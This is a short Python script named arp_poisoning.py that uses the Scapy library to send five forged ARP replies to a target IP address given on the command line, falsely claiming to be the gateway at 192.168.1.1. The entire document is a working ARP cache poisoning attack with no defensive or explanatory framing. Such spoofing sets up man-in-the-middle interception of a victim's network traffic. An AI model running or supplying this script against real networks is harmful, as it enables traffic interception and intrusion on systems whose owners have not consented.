# arp_poisoning.py
from scapy.all import ARP, send
import sys

def arp_poison(target_ip):
    print("[*] Sending ARP poisoning packets to", target_ip)
    arp_response = ARP(pdst=target_ip, psrc="192.168.1.1", op="is-at")
    send(arp_response, count=5, verbose=False)
    return "ARP Poisoning packets sent."

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.5'
    print(arp_poison(target))
